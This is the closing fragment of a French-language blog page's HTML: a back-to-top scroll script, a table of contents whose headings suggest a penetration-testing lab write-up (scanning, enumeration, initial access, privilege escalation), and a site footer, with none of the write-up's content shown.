<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès Initial</a></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a><ul><li><a href=#explication-détaillée>Explication Détaillée</a></li></ul></li><li><a href=#mots-de-fin>Mots de Fin</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>